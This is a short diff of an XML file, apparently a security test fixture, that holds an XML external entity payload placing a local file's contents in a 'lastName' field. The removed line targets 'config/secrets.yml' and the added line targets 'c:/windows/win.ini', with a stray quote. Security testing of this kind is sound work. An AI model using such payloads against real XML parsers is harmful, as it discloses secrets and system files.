@@ -1,5 +1,5 @@
 <!--?xml version="1.0" ?-->
-<!DOCTYPE replace [<!ENTITY ent SYSTEM "file://config/secrets.yml"> ]>
+<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///c:/windows/win.ini""> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&ent;</lastName>
